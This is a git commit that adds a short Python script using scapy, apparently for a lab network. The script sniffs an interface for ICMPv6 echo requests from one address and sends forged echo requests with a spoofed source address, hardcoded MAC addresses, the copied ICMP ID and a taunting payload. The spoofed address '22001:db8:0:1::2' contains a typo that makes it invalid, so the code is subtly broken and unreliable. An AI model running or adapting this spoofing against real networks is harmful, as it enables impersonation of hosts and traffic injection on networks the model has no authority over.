0f1bfbe871525e2a654ee1068679d411b335ce0b
Ameen Al-Azzawi <45686881+ameen-mcmxc@users.noreply.github.com>
2023-05-27 10:51:10 +0200

    Create icmp-spoofer.py

---
+++ scripts/icmp-spoofer.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+
+
+# This scritp sniffes the communication channel on Interface ens34, looks for ICMPv6 packet.
+# Then, it spoofes the source IP address of the found packet and sends identical packet to the same recipient.
+
+# function to process the packet
+def process_packet(packet):
+    if packet.haslayer(ICMPv6EchoRequest) and packet[IPv6].src == "2001:db8:0:1::2":
+        icmp_id = packet.getlayer(ICMPv6EchoRequest).id
+        print("[+] Found ICMPv6 packet with source port (ICMP-ID): ", icmp_id)
+        ether = Ether(dst="00:0c:29:18:4c:dc", src="00:0e:31:29:5b:af")
+        ipv6 = IPv6(src="22001:db8:0:1::2", dst="2001:db8:2::2")
+        icmp6 = ICMPv6EchoRequest(id=icmp_id, data="From Ameen with Love!")
+        new_packet = ether/ipv6/icmp6
+        sendp(new_packet, iface="ens34")
+
+# start sniffing on ens34
+sniff(iface='ens34', filter="icmp6", prn=process_packet)
